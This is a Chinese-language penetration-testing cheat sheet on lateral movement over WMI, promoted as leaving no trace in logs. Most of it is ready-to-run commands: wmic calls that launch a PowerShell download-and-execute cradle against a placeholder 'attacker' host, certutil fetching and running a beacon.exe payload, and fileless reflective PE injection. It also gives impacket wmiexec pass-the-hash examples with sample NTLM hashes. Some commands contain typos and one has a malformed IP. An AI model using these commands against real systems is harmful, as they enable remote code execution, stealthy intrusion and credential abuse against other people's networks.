# WMI移动(不会在日志系统留下痕迹)
利用条件:
1.wmi服务开启,端口135,默认开启
2.防火墙允许135,445等端口通信
3.知道目标机的庄户密码或HASH

利用:
1.wmic(内置-单执行)  
```
无回显,需要明文密码

基础语法命令:
wmic /node:"目标IP" /user:"用户名" /password:"密码" process call create "命令"


反弹cmd
wmic /node:192.168.1.10 /user:admin /password:Pass123 process call create "cmd.exe /c powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')\""

下载文件
wmin /node:192.168.111.130 /user:sqlserver\administrator /password:admin!@#45 process call create"certutil -urlcache -split -f http://192.168.192.168.111.128/beacon.exe c:/beacon.exe"
执行文件
wmin /node:192.168.111.130 /user:sqlserver\administrator /password:admin!@#45 process call create "c:/beacon.exe"


无文件执行
# PowerShell内存加载
wmic /node:192.168.111.130 process call create "powershell -nop -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.111.128/Invoke-ReflectivePEInjection.ps1');Invoke-ReflectivePEInjection -PEBytes (Invoke-WebRequest http://192.168.111.128/beacon.exe -UseBasicParsing | Select-Object -Expand Content)"

```

---
2.wmiexec-impacket  (命令回显,交互式)
```
wmiexec.py sqlserver/administrator:admin!@#45@192.168.3.32 "whoami"

进入交互式shell

# 基础认证
wmiexec.py 域名/用户名:密码@目标I

# 使用哈希认证 (Pass-the-Hash)
wmiexec.py -hashes LMHASH:NTHASH 域名/用户名@目标IP


# 本地管理员账户
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 ./Administrator@192.168.111.130

# 域管理员账户
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c domain/Administrator@192.168.111.130

```
踩坑:目标需要是内置管理员账户或system